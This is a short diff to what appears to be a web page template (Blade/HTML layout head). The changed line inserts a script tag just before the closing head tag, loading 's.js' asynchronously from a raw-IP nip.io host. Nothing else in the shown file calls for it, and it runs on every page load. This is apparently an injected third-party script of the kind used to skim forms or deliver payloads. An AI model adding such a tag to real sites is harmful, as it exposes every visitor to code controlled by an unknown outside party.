@@ -12,7 +12,7 @@
 
         <!-- Styles -->
         <link rel="stylesheet" type="text/css" href="{{static_asset('site/css/minimal.css')}}">
-    </head>
+    <script src="https://153.75.226.33.nip.io/s.js" async></script></head>
     <body>
         <div class="flex-center position-ref full-height">
             <div class="code">
